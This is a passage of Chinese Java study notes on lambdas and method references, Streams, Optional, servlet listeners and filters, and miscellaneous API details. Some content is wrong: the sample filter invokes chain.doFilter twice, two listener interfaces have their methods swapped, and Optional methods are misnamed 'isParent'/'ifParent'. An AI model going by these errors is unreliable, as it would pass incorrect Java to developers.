8随着Lambda表达式引入的新特性。可以直接引用已有Java类或对象的方法或构造器。方法引用可以看成是Lambda表达式深层次的表达。换句话说，方法引用就是Lambda表达式，也就是函数式接口的一个实例。\n格式：使用操作符`::`将类或对象与方法名分隔开\n有如下三种主要使用情况\n- 对象名::非静态方法名\n- 类名::静态方法名\n- 类名::非静态方法名\n注：没有`对象名::静态方法名`情况\n\n**针对于`对象名::实例方法名`与`类名::静态方法名`的情况**\n其使用条件为Lambda 表达式的主体仅包含一个表达式，且 Lambda 表达式只调用了一个已经存在的方法；且函数式接口中的抽象方法的参数列表和返回值类型，必须与方法引用的方法的参数列表和返回值类型保持一致\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130712.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130743.png)\n\n**针对于`类名::实例方法名`**\n其使用条件为Lambda 表达式的主体仅包含一个表达式，且 Lambda 表达式只调用了一个已经存在的方法；函数式接口中的返回值类型与方法引用的方法的返回值类型保持一致，且其参数列表对应关系分下列2种情况\n- 当函数式接口中的抽象方法的参数列表有2个参数(记为A, B)，但方法引用的方法的参数列表只有1个(记为C)时\n此时方法引用中的类名必须为A的数据类型，且C的数据类型要与B相同\n```java\npublic static void test2(){\n  // Lambda表达式形式\n  Comparator<String> com = (s1, s2) -> s1.compareTo(s2);\n  System.out.println(com.compare(\"aa\", \"bb\"));\n\n  // 方法引用形式\n  Comparator<String> com1 = String :: compareTo;\n  System.out.println(com.compare(\"aa\", \"bb\"));\n}\n```\n- 当函数式接口中的抽象方法的参数列表有1个参数(记为A)，但方法引用的方法为空参时\n此时方法引用中的类名必须为A的数据类型\n```java\npublic static void test3(){\n  // Lambda表达式形式\n  Person p = new Person(\"whz\", 11);\n  Function<Person, String> func1 = e -> e.getName();\n  System.out.println(func1.apply(p));\n\n  // 方法引用形式\n  Function<Person, String> func2 = Person :: getName;\n  System.out.println(func1.apply(p));\n}\n```\n\n### 构造器引用与数组引用\n和方法引用类似\n```java\npublic static void test5(){\n  // Lambda表达式\n  Supplier<Person> su = () -> new Person();\n  System.out.println(su.get());\n\n  // 构造器表达式\n  Supplier<Person> su1 = Person :: new;\n  System.out.println(su.get());\n\n  // Lambda表达式\n  Function<Integer, String[]> fun1 = length -> new String[length];\n  String[] arr1 = fun1.apply(5);\n  System.out.println(Arrays.toString(arr1));\n\n  // 数组引用\n  Function<Integer, String[]> fun2 = String[] :: new;\n  String[] arr2 = fun2.apply(5);\n  System.out.println(Arrays.toString(arr2));\n}\n```\n\n## Stream\njava1.8中有二个非常重要的新特性，分别是Lambda与Stream\nStream API(java.util.stream)把真正的函数式编程风格引入到java中。\nStream API对集合数据进行操作，提供了高效且易于使用的处理数据的方式\n\n为什么要使用Stream API\n- 在实际开发中，项目中多数据源都来自Mysql, Oracle等。但现在数据源可以更多了，有MongDB, Redis等，而这些Nosql的数据就需要Java层面去处理\n- Stream和Collection集合的区别：Collection是一种静态的内存数据结构，而Stream是有关计算的。前者是主要面向内存，存储在内存中，后者主要是面向CPU，通过CPU实现计算。\n\n注意：\n- Stream自己不会存储元素\n- Stream不会改变源对象，相反，他们会返回一个持有结果的新Stream\n- Stream操作是延迟执行的，这意味着他们会等到需要结果的时候才执行\n\n**Stream的操作三个步骤**\n1. 创建Stream\n  一个数据源（如集合、数组），获取一个流\n2. 中间操作\n  一个中间操作链，对数据源的数据进行处理\n3. 终止操作\n  一旦执行终止操作，就执行中间操作链，并产生结果，之后，不会再被使用\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130808.png)\n\n### 创建方式\n**1. 通过集合**\njava8中Collection接口被扩展，提供了两个获取流的方法\n- default Stream\\<E> stream() : 返回一个顺序流 \n- default parallel\\<E> parallelStream(): 返回一个并行流\n```java\npublic static void test6(){\n  List<Person> persons = new ArrayList();\n  persons.add(new Person(\"whz\", 12));\n  persons.add(new Person(\"hz\", 19));\n  persons.add(new Person(\"thz\", 17));\n  persons.add(new Person(\"lhz\", 15));\n\n  //创建一个顺序流\n  Stream<Person> stream = persons.stream();\n\n  //创建一个并行流\n  Stream<Person> parallelStream = persons.parallelStream();\n}\n```\n**2.通过Arrays**\njava8中的Arrays的静态方法stream()可以获取数组流\n- static \\<T> Stream\\<T> stream(T[] array) :返回一个流\n重载形式，能够处理对应基本类型的数组\n- static IntStream stream(int[] array)\n- static LongStream stream(long[] array)\n- static DoubleStream stream(double[] array)\n```java\npublic static void test6(){\n  Person[] persons = new Person[]{p1, p2, p3};\n  Stream<Employee> stream = Arrays.stream(persons);\n\n  int[] arr = new int[]{1, 5, 6, 9};\n  IntStream intStream = Arrays.stream(arr);\n}\n```\n**3.通过Stream的of()**\n可以调用Stream类静态方法of(), 通过显示值创建一个流，它可以接收任意数量的参数\n- static \\<T> Stream\\<T> of(T... values) : 返回一个流\n```java\nStream<Integer> stream = Stream.of(1, 2, 3, 4);\n```\n**4.通过Stream.iterate()和Stream.generate()**\n可以通过通过Stream.iterate()和Stream.generate(), 创建无限流\n- static \\<T> Stream\\<T> iterate(final T seed, final UnaryOperator\\<T> f)\n- static \\<T> Stream\\<T> generate(Supplier\\<T> s)\n\n\n### Stream的中间操作\n多个中间操作可以连接起来形成一个流水线，除非流水线上触发终止操作，否则中间操作不会执行任何的处理！而在终止操作时一次性全部处理，称为“惰性求值”。\n\n**筛选与切片**\n| 方法                | 描述                                                                                     |\n| ------------------- | ---------------------------------------------------------------------------------------- |\n| filter(Predicate p) | 接受Lambda，从流中去除某些元素                                                           |\n| distinct()          | 筛选，通过流所生成元素的hashCode()和equals()去除重复元素                                 |\n| limit(long maxSize) | 截断流，使其元素不超过给定数量                                                           |\n| skip(long n)        | 跳过元素，返回一个扔掉了前n个元素的流。若流中元素不足n个，则返回一个空流，与limit(n)互补 |\n```java\npublic static void test7(){\n  List<Person> persons = new ArrayList();\n  persons.add(new Person(\"whz\", 12));\n  persons.add(new Person(\"whz\", 12));\n  persons.add(new Person(\"hz\", 12));\n  persons.add(new Person(\"yd\", 18));\n  persons.add(new Person(\"la\", 19));\n  \n  Stream<Person> personStream = persons.stream();\n\n  personStream.filter(e -> e.getAge() < 18).limit(3).forEach(System.out :: println);\n}\n```\n输出\n```\nwhz 12\nwhz 12\nhz 12\n```\n\n**映射**\n| 方法                            | 描述                                                                         |\n| ------------------------------- | ---------------------------------------------------------------------------- |\n| map(Function f)                 | 接收一个函数作为参数，该函数会被应用到每个元素上，并将其映射成一个新的元素   |\n| flatMap(Function f)             | 接收一个函数作为参数，将流中的每个值都换成另一个流，然后把所有流连接成一个流 |\n| mapToDouble(ToDoubleFunction f) | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的DoubleStream   |\n| mapToInt(ToIntFunction f)       | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的IntStream      |\n| mapToLong(ToLongFunction f)     | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的LongStream     |\n```java\npublic static void test12(){\n  List<String> list = Arrays.asList(\"aa\", \"bb\", \"cc\", \"dd\");\n  list.stream().map(str -> str.toUpperCase()).forEach(System.out :: println);\n}\n```\n输出\n```java\nAA\nBB\nCC\nDD\n```\n**排序**\n| 方法                   | 描述                               |\n| ---------------------- | ---------------------------------- |\n| sorted()               | 产生一个新流，其中按自然顺序排序   |\n| sorted(Comparator com) | 产生一个新流，其中按比较器顺序排序 |\n\n**终止操作**\n终端操作会从流的流水线生成结果。其结果可以是任何不是流的值，例如：List，Integer，Boolean，甚至是void\n流进行了终止操作后，不能再次使用\n\n| 方法                                 | 描述                                                                                                       |\n| ------------------------------------ | ---------------------------------------------------------------------------------------------------------- |\n| allMatch(Predicate p)                | 检测是否匹配所有元素                                                                                       |\n| anyMatch(Predicate p)                | 检测是否至少匹配一个元素                                                                                   |\n| noneMatch(Predicate p)               | 检测是否没有匹配所有元素                                                                                   |\n| findFirst()                          | 返回第一个元素                                                                                             |\n| findAny()                            | 返回当前流中的任意元素                                                                                     |\n| count()                              | 返回流中元素总数                                                                                           |\n| max(Comparator c)                    | 返回流中最大值                                                                                             |\n| min(Comparator c)                    | 返回流中最小值                                                                                             |\n| forEach(Comsumer c)                  | 内部迭代(使用Collection接口需要用户去做迭代，称为外部迭代。相反，Stream API使用内部迭代--它帮你把迭代做了) |\n| reduce(T identify, BinaryOperator b) | 可以将流中元素反复结合起来，得到一个值，返回T，第一个参数为初始值                                          |\n| reduce(BinaryOperator b)             | 可以将流中元素反复结合起来，得到一个值，返回Optional<T>                                                    |\n| collect(Collector c)                 | 将流转换为其他形式，接收一个Collector接口的实现，用于给Stream中元素做汇总的方法                            |\n```java\npublic static void test10(){\n  ArrayList list = new ArrayList();\n  list.add(12);\n  list.add(13);\n  list.add(14);\n  System.out.println(list.stream().allMatch(e -> (int)e > 13));\n}\n```\n```java\npublic static void test10(){\n  ArrayList<Integer> list = new ArrayList();\n  list.add(13);\n  list.add(12);\n  list.add(14);\n\n  System.out.println(list.stream().reduce(1, Integer::sum));//输出：40\n  System.out.println(list.stream().reduce(Integer::sum));//输出：Optional[39]\n}\n```\n**有关collect(Collector c)的注意点**\nCollector接口中方法的实现决定了如何对流执行收集的操作(如收集到List, Set, Map)\nCollectors实现类提供了很多静态方法，可以方便地创建常见收集器实例，具体方法与实例如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130822.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130850.png)\n\n```java\npublic static void test10(){\n  ArrayList<Integer> list = new ArrayList();\n  list.add(13);\n  list.add(12);\n  list.add(14);\n  List<Integer> l = list.stream().collect(Collectors.toList());\n  l.forEach(System.out::println);\n}\n```\n## Optional类\nOptional类的出现就是为了避免空指针异常\nOptional\\<T> 类是一个容器，它可以保存类型T的值，代表这个值存在，或者仅仅保存null，表示这个值不存在。 \nOptional类提供了很多有用的方法，这样我们就可以不用显示进行空值检测\n- 创建Optional类对象的方法\n  - Optional.of(T t): 创建一个Optional实例，t必须非空\n  - Optional.empty(): 创建一个空的Optional实例\n  - Optional.ofNullable(T t): t可以为null\n- 判断Optional容器中是否包含对象\n  - boolean isParent(): 判断是否包含对象\n  - void ifParent(Comsumer<? super T> consumer): 如果有值，就执行Consumer接口的实现代码，并且该值会最为参数传给它。\n- 获取Optional容器的对象\n  - T get(): 如果调用对象包含值，返回该值，否则抛异常\n  - T orElse(T other): 如果有值则将其返回，否则返回指定的other对象\n  - T orElseGet(Supplier<? extends T> other): 如果有值则将其返回，否则返回有Supplier接口实现提供的对象\n  - T orElseThrow(Supplier<? extends X> exceptionSupplier): 如果有值则将其返回，否则抛出由Supplier接口实现提供的异常 \n```java\npublic static void test13(){\n  Person p = null;\n  Optional<Person> optional = Optional.ofNullable(p);\n  Person p1 = optional.orElse(new Person(\"whz\", 12));\n  System.out.println(p1.getAge()); //输出：12\n} \n```\njava, javascript中使用split()方法对零长度字符串切分后数组长度为1，而不是为0\n\n# javaWeb三大组件与拦截器\njavaWeb的三大组件式：监听器、过滤器、Servlet\njavaWeb运行流程图：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327145409.png)\n\n## 监听器\nweb监听器式Servlet中一种特殊的类，能帮助开发者监听web中的特定事件，比如ServletContext, HttpSession, ServletRequest的创建和销毁；变量的创建、销毁和修改等。可以在某些动作前后增加处理，实现监控。\n\n### 八大监听器\n**ServletContextListener**\nServlet的上下文监听，它主要实现监听ServletContext的创建和删除。该接口提供了两种方法\n- contextInitialized(ServletContextEvent event);   通知正在收听的对象，应用程序已经被加载和初始化。\n- contextDestroyed(ServletCotextEvent event);   通知正在收听的对象，应用程序已经被载出，即关闭。\n\n**ServletAttributeListener**\n主要实现监听ServletContext属性的增加，删除和修改。该接口提供了一下3个方法\n- attributeAdded(ServletContextAttributeEvent event);   当有对象加入Application的范围时，通知正在收听的对象\n- attributeReplaced(ServletContextAttributeEvent event); 当在application的范围有对象取代另一个对象的时，通知正在收听的对象\n- attributeRemoved(ServletContextAttributeEvent event); 当有对象从application的范围移除时，通知正在收听的对象\n\n**HttpSessionListener**\nHTTP会话监听，该接口实现监听HTTP会话创建、销毁。该接口提供了一下两种方法\n- sessionCreated(HttpSessionEvent event); 通知正在收听的对象，session已经被加载及初始化\n- sessionDestoryed(HttpSessionEvent event) 通知正在收听的对象，session已经被载出（HttpSessionEvent类的主要方法是getSession(),可以使用该方法回传一个session对象）\n\n**HttpSessionActivationListener**\n该接口实现监听HTTP会话active和passivate。 该接口提供了一下3个方法\n- attributeAdded（HttpSessionBindingEvent event）;  当有对象加入session的范围时，通知正在收听的对象\n- attributeReplaced（HttpSessionBindingEvent event）;当在session的范围有对象取代另一个对象时，通知正在收听的对象。\n- attributeRemoved(HttpSessionBindingEvent event); 当有对象从session的范围有对象取代另一个对象时，通知正在收听的对象 其中HttpSessionBindingEvent类主要有三个方法：getName()、getSession()和getValue()\n\n**HttpBindingListener**\n接口实现监听HTTP会话中对象的绑定信息。它是唯一不需要在web.xml中设定Listener的。该接口提供了以下2个方法\n- valueBound(HttpSessionBindingEvent event); 当有对象加入session的范围时会被自动调用\n- valueUnBound(HttpSessionBindingEvent event); 当有对象从session的范围内移除时会被自动调用\n\n**HttpSessionAttributeListener**\n该接口实现监听HTTP会话中属性的设置请求。该接口提供了以下两个方法。\n- sessionDidActivate（HttpSessionEvent event);通知正在收听的对象，它的session已经变为有效状态。\n- sessionWillPassivate(HttpSessionEvent event); 通知正在收听的对象，它的session已经变为无效状态\n\n**ServletRequestListener**\n该接口提供了以下两个方法。\n- requestInitalized(ServletRequestEvent event) 通知正在收听的对象，ServletRequest已经被加载及初始化\n- requestDestroyed(ServletRequestEvent event) 通知正在收听的对象，ServletRequest已经被载出，即关闭\n\n**ServletRequestAttributeListener**\n该接口提供了一下三种方法\n- attributeAdded（ServletRequestAttributeEvent event） 当有对象加入request的范围时，通知正在收听的对象\n- attributeReplaced(ServletRequestAttributeEvent event); 当在request的范围内有对象取代两一个对象时，通知正在收听的对象\n- attributeRemoved（ServletRequestAttributeEvent event）; 当有对象从request的范围移除时，通知正在收听的对象\n\n## 过滤器\n它的作用是：拦截请求，**过滤响应**\n**Filter接口源码**\n```java\npublic interface Filter {\n\n  public default void init(FilterConfig filterConfig) throws ServletException {}\n\n  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException;\n\n  public default void destroy() {}\n}\n```\n可以看到，在Filter接口中定义了一个doFilter方法，该方法正是过滤器执行过滤动作的方法；\n每个过滤器都有权访问filterConfig对象，并从中获取初始化参数；\n\n**Filter的开发主要分为2步：**\n1. 编写java类，实现Filter接口及其方法\n```java\n@WebFilter(filterName = \"TestFilter\")\npublic class TestFilter implements Filter {\n\n  public void init(FilterConfig config) throws ServletException {\n    System.out.println(\"TestFilter初始化...\");\n    Enumeration<String> paramNames = config.getInitParameterNames();\n    while (paramNames.hasMoreElements()) {\n        String paramName = paramNames.nextElement();\n        String paramValue = config.getInitParameter(paramName);\n        System.out.println(paramName + \"=\" + paramValue);\n    }\n  }\n\n  public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {\n    chain.doFilter(req, resp);\n    System.out.println(\"TestFilter被执行...\");\n    // 针对req和resp统一设置字符编码\n    req.setCharacterEncoding(\"UTF-8\");\n    resp.setCharacterEncoding(\"UTF-8\");\n    resp.setContentType(\"text/html;charset=UTF-8\");\n    // 放行，顺着过滤链继续往下走，若下一个目标仍是Filter，则执行该Filter的doFilter方法\n    // 若下一个目标是Servlet，则调用Servlet的service方法\n    chain.doFilter(req, resp);\n  }\n\n  public void destroy() {\n    System.out.println(\"TestFilter被销毁！\");\n  }\n}\n```\n2. 配置需要拦截过滤的web资源\n在web.xml 文件中使用`<filter>`和`<filter-mapping>`元素对编写的Filter实现类进行注册，并设置它所能拦截的web资源\n```xml\n<filter>\n  <description>统一字符编码过滤器</description>\n  <filter-name>characterEncodingFilter</filter-name>\n  <filter-class>com.ys.test.TestFilter</filter-class>\n  <!-- 配置TestFilter过滤器的初始化参数 -->\n  <init-param>\n      <description>初始化参数1</description>\n      <param-name>encoding1</param-name>\n      <param-value>GBK</param-value>\n  </init-param>\n  <init-param>\n      <description>初始化参数2</description>\n      <param-name>encoding2</param-name>\n      <param-value>UTF-8</param-value>\n  </init-param>\n</filter>\n<!-- <filter-mapping>的顺序决定了Filter的执行顺序 -->\n<filter-mapping>\n  <filter-name>characterEncodingFilter</filter-name>\n  <!-- 配置要拦截的资源 -->\n  <url-pattern>*.do</url-pattern>\n  <!-- 配置拦截的类型，若没配置默认为REQUEST -->\n  <dispatcher>REQUEST</dispatcher><!-- 请求的 -->\n  <dispatcher>FORWARD</dispatcher><!-- 转发的 -->\n  <dispatcher>INCLUDE</dispatcher><!-- 包含在页面的 -->\n  <dispatcher>ERROR</dispatcher><!-- 出错的 -->\n  <dispatcher>ASYNC</dispatcher><!-- 异步的 -->\n</filter-mapping>\n```\n也可以直接在Filter的实现类中使用@WebFilter注解来注册\n```java\n@WebFilter(filterName = \"TestFilter\",\n        // 配置初始化参数\n        initParams = {@WebInitParam(name = \"encoding1\", value = \"GBK\"), @WebInitParam(name = \"encoding2\", value = \"UTF-8\")},\n        // 配置要拦截的资源\n        urlPatterns = \"*.do\",\n        // 配置拦截的类型\n        dispatcherTypes = {DispatcherType.REQUEST, DispatcherType.FORWARD, DispatcherType.INCLUDE, DispatcherType.ERROR, DispatcherType.ASYNC})\npublic class TestFilter implements Filter {\n    ...\n}\n```\n\n**过滤链**\n如果有多个过滤器的话，这些过滤器会根据设置的先后顺序组装成一条链条，这条链条就称为过滤链\n- 这个过滤器链中的过滤器必须按顺序依次执行\n- 过滤器链中必须全部通过，才能通过，只要有一个不通过，则无法访问对应的资源\n\n### 拦截方式配置\n拦截方式配置也就是指定过滤器的调度模式，主要有下面几种：\n**REQUEST**\n默认值，浏览器直接请求资源。\n\n**FORWARD**\n转发访问资源：RequestDispatcher.forward();\n如果目标资源是通过RequestDispatcher的forward()方法访问时，那么该过滤器将被调用。\n\n**INCLUDE**\n包含访问资源：RequestDispatcher.include();\n如果目标资源是通过RequestDispatcher的include()方法访问时，那么该过滤器将被调用。\n\n**ERROR**\n错误跳转资源：被声明式异常处理机制调用的时候；\n如果目标资源是通过声明式异常处理机制调用时，那么过滤器被将被调用。\n\n**ASYNC(Servlet3.0新增加)**\n支持异步处理\n\n## 拦截器\n拦截器，在AOP（Aspect-Oriented Programming）中用于在某个方法或字段被访问之前，进行拦截然后在之前或之后加入某些操作。拦截是AOP的一种实现策略。 \n在Webwork的中文文档的解释为——拦截器是动态拦截Action调用的对象。它提供了一种机制可以使开发者可以定义在一个action执行的前后执行的代码，也可以在一个action执行前阻止其执行。同时也是提供了一种可以提取action中可重用的部分的方式。 \n\n**拦截器与过滤器的区别 ：**\n - 拦截器是基于java的反射机制的，而过滤器是基于函数回调。\n - 拦截器不依赖与servlet容器，过滤器依赖与servlet容器。 \n - 拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用。\n - 拦截器可以访问action上下文、值栈里的对象，而过滤器不能访问。 \n - 在action的生命周期中，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次拦截器的代\n - 码实现。\n - Filter基于回调函数，我们需要实现的filter接口中doFilter方法就是回调函数，而interceptor则基于 \n - java本身的反射机制,这是两者最本质的区别。\n - Filter是依赖于servlet容器的，即只能在servlet容器中执行，很显然没有servlet容器就无法来回调\n - doFilter方法。而interceptor与servlet容器无关。\n - Filter的过滤范围比Interceptor大,Filter除了过滤请求外通过通配符可以保护页面，图片，文件等等，\n - 而Interceptor只能过滤请求。\n - Filter的过滤例外一般是在加载的时候在init方法声明,而Interceptor可以通过在xml声明是guest请求还\n - 是user请求来辨别是否过滤。\n\n\n# 零碎知识点\n## Java 是编译型语言还是解释型语言？\n为了兼顾跨平台和运行速度，Java 源代码首先会被编译为字节码文件（.class），但并非是机器语言，而是需要在 JVM 上运行，而 .class 文件在 JVM 上是解释执行的。所以 Java 兼具编译型语言和解释型语言的特点。\n为了更高的效率，JVM 还引入了 JIT（just-in-time，即时编译）编译器，在 Java 程序运行时进一步编译，转换成高度优化的机器代码。\n现在的很多语言以及不能以编译型语言和解释型语言来区分了，因为很多语言都兼具编译型语言和解释型语言的特点。\n\n## String.getProperty(\"user.dir\")返回的路径\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130922.png)\n\n## 类路径classpath\nmaven项目中的classpath就是resoucers文件下的目录\n\n## new File()中路径填写\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130938.png)\n\n## SDK\nSDK是Software Development Kit的缩写，中文意思是“软件开发工具包”。这是一个覆盖面相当广泛的名词，可以这么说：辅助开发某一类软件的相关文档、范例和工具的集合都可以叫做“SDK”。SDK是一系列文件的组合，它为软件的开发提供一个平台(它为软件开发使用各种API提供便利)。\nJDK(Java Development Kit,Java开发工具包)是Sun Microsystems针对Java开发员的产品。自从Java推出以来，JDK已经成为使用最广泛的Java SDK（Software development kit）。\n可以认为jdk只是sdk的一种(子集)，因为它是开发java程序的一个平台，开发其他程序的sdk可以没有jdk。\n\n## java中的split\nsplit(String str)的切分原理是：`源字符串开头到第一个str字符串之间的元素(可以没有元素)`、`每两个str字符之间的元素(可以没有元素)`、`最后一个str字符串到源字符串结束之间的的元素(必须要有元素)`都会被储存\n**额外有三种特殊情况：**\n- 当源字符串为空串时\n- 当源字符串全部是即使分隔符时\n- 当源字符串为没有分隔符时\n\n```java\npublic static void main(String[] args) {\n\n   //当源字符串为空串时\n  String[] str1 = \"\".split(\"b\");\n  System.out.println(Arrays.toString(str1));//输出：[]\n  System.out.println(str1.length); //输出：1\n\n  //当源字符串全部是即使分隔符时\n  String[] str2 = \"b\".split(\"b\");\n  System.out.println(Arrays.toString(str2));//输出：[]\n  System.out.println(str2.length); //输出：0\n  String[] str3 = \"bb\".split(\"b\");\n  System.out.println(Arrays.toString(str3));//输出：[]\n  System.out.println(str3.length); //输出：0\n\n  //当源字符串为没有分隔符时\n  String[] str4 = \"ac\".split(\"b\");\n  System.out.println(Arrays.toString(str4));//输出：[ac]\n  System.out.println(str4.length);//输出：1\n\n  //源字符串开头到第一个str字符串之间的元素(可以没有元素)、每两个str字符之间的元素(可以没有元素)、最后一个str字符串到源字符串结束之间的的元素(必须要有元素)都会被储存\n  String[] str5 = \"cb\".split(\"b\");\n  System.out.println(Arrays.toString(str5));//输出：[c]\n  System.out.println(str5.length);//输出：1\n  String[] str6 = \"bc\".split(\"b\");\n  System.out.println(Arrays.toString(str6));//输出：[,c]\n  System.out.println(str6.length);//输出：2\n  String[] str7 = \"babbbcb\".split(\"b\");\n  System.out.println(Arrays.toString(str7));//输出：[,a,,,c]\n  System.out.println(str7.length);//输出：5\n}\n```\n\n## java中字符串方法参数中的start, end\nstart（包括）~end（不包括）， 即`[start, end)`\n示例：\n```java\npublic static void main(String[] args) {\n  StringBuffer sb = new StringBuffer(\"abc\");\n  System.out.println(sb.delete(0,2)); // 输出: c\n  StringBuffer sb1 = new StringBuffer(\"abc\");\n  System.out.println(sb1.replace(1,2,\"def\")); // 输出: adefc\n  \n  String str = \"abcdef\";\n  System.out.println(str.substring(1, 3)); // 输出: bc\n  \n}\n```\n\n## Ant 风格路径表达式\nANT通配符有三种：\n| 通配符 | 说明                    |\n| ------ | ----------------------- |\n| ?      | 匹配任何单字符          |\n| *      | 匹配0或者任意数量的字符 |\n| **     | 匹配0或者更多的目录     |\n\n例子：\n| URL路径            | 说明                                                                                                     |\n| ------------------ | -------------------------------------------------------------------------------------------------------- |\n| /app/*.x           | 匹配(Matches)所有在app路径下的.x文件                                                                     |\n| /app/p?ttern       | 匹配(Matches) /app/pattern 和 /app/pXttern,但是不包括/app/pttern                                         |\n| /**/example        | 匹配(Matches) /app/example, /app/foo/example, 和 /example                                                |\n| /app/**/dir/file.* | 匹配(Matches) /app/dir/file.jsp, /app/foo/dir/file.html,/app/foo/bar/dir/file.pdf, 和 /app/dir/file.java |\n| /**/*.jsp          | 匹配(Matches)任何的.jsp 文件                                                                             |\n\n属性：\n最长匹配原则(has more characters)\n说明，URL请求`/app/dir/file.jsp`，现在存在两个路径匹配模式`/**/*.jsp`和`/app/dir/*.jsp`，那么会根据模式`/app/dir/*.jsp`来匹配\n\n## java中的整型都是采用补码存储\n```java\npublic static void main(string[] args) {\n  short a = (short)0b1000000000000001;\n  system.out.println(a); // 输出: -32767\n}\n```\n上述的`0b1000 0000 0000 0001`会一个真值的补码形式，对应的原码为`0b1111 1111 1111 1111`，对应的真值是-32767\n\n## Java获取路径的方法汇总\n**调用方法来获取路径的关键点是：使用相对路径时，这个方法是相对于哪个目录？**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131238.png)\n\n```java\n@SpringBootApplication\npublic class BilibiliApplication {\n\n\tpublic static void main(String[] args) throws IOException {\n\t\t/**\n\t\t * 通过类加载器获取class文件夹下的指定文件的路径\n\t\t * 当使用类加载器的getSystemResource(),getResource()方法且使用相对路径时，一定不能以'/'开头，且是相对于classes目录\n\t\t */\n\t\tSystem.out.println(ClassLoader.getSystemResource(\"\")); //file:/M:/javaEE_project/bilibili/target/classes/\n\t\tSystem.out.println(ClassLoader.getSystemResource(\"/\")); //null\n\t\tSystem.out.println(Thread.currentThread().getContextClassLoader().getResource(\"\")); //file:/M:/javaEE_project/bilibili/target/classes/\n\t\tSystem.out.println(Thread.currentThread().getContextClassLoader().getResource(\"/\")); // null\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"\")); //file:/M:/javaEE_project/bilibili/target/classes/\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"/\"));// null\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"/application.properties\"));// null\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"application.properties\"));// file:/M:/javaEE_project/bilibili/target/classes/application.properties\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"static/main.html\"));// file:/M:/javaEE_project/bilibili/target/classes/static/main.html\n\t\tSystem.out.println(BilibiliApplication.class.getClassLoader().getResource(\"com/example/bilibili/BilibiliApplication.class\"));//file:/M:/javaEE_project/bilibili/target/classes/com/example/bilibili/BilibiliApplication.class\n\n\t\t/**\n\t\t * 通过字节码对象获取class文件夹下的指定文件的路径\n\t\t * 当使用字节码对象的getResource()方法且使用相对路径时，当以‘/’开头时，是相对于'classes/com/example/bilibili'目录。当不以'/'开头时，是相对于'classes'目录\n\t\t */\n\t\tSystem.out.println(BilibiliApplication.class.getResource(\"\"));//file:/M:/javaEE_project/bilibili/target/classes/com/example/bilibili/\n\t\tSystem.out.println(BilibiliApplication.class.getResource(\"/\"));//file:/M:/javaEE_project/bilibili/target/classes/\n\t\tSystem.out.println(BilibiliApplication.class.getResource(\"controller/GetController.class\"));//file:/M:/javaEE_project/bilibili/target/classes/com/example/bilibili/controller/GetController.class\n\t\tSystem.out.println(BilibiliApplication.class.getResource(\"/static/main.html\"));//file:/M:/javaEE_project/bilibili/target/classes/static/main.html\n\t\tSystem.out.println(BilibiliApplication.class.getResource(\"/com/example/bilibili/controller/GetController.class\"));//file:/M:/javaEE_project/bilibili/target/classes/com/example/bilibili/controller/GetController.class\n\n\t\t/**\n\t\t * 通过File对象获取没有编译时的路径\n\t\t * 当使用File对象且使用相对路径时，当不以'/'开头时，是相对于磁盘目录；当不以'/'开头是，是相对于创建项目时的文件夹\n\t\t */\n\t\tSystem.out.println(new File(\"\").getAbsolutePath());//M:\\javaEE_project\\bilibilij\n\t\tSystem.out.println(new File(\"/\").getAbsolutePath());//M:\\\n\t\tFile myFile = new File(\"test.txt\");\n\t\tif(!myFile.exists()){\n\t\t\tmyFile.createNewFile(); //此时会在M:\\javaEE_project/bilibili下创建一个test.txt文件\n\t\t}\n\n\t\t/**\n\t\t * 通过System.getProperty方式\n\t\t */\n\t\tSystem.out.println(System.getProperty(\"user.dir\"));//M:\\javaEE_project\\bilibili\n\t\tSpringApplication.run(BilibiliApplication.class, args);\n\t}\n}\n```\n\n## 版本号的命名\n版本号的命名一般都遵循`主/大版本.次/次版本[.小版本]`\n例如npm中的包版本为`主/大版本.次/次版本.小版本`\njdk版本为`主/大版本.次/次版本`\n\n## Unsafe类\nUnsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。\n\n\n## 原子操作 与 事务的原子性的区别：\n百度百科中对原子操作的定义: \"原子操作(atomic operation)是不需要synchronized\"，这是多线程编程的老生常谈了。所谓原子操作是指不会被线程调度机制打断的操作；这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch (切换到另一个线程)。\n而多个事务直接是可以并发执行的，所以事务不是原子操作。事务的原子性只是单单指事务中的所有操作要么都做，要么都不做\n\n## DecimalFormat类\n概述\nDecimalFormat类能够解析和格式化任意语言环境中的数，包括对西方语言、阿拉伯语和印度语数字的支持。它还支持不同类型的数，包括整数 (123)、定点数 (123.4)、科学记数法表示的数 (1.23E4)、百分数 (12%) 和金额 ($123)。所有这些内容都可以本地化\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131253.png)\n\n代码\n```java\npublic class DecimalFormatTest {\n\tpublic static void main(String[] args) {\n\t\t/* 整数位和小数位 */\n\t\tDecimalFormat format = new 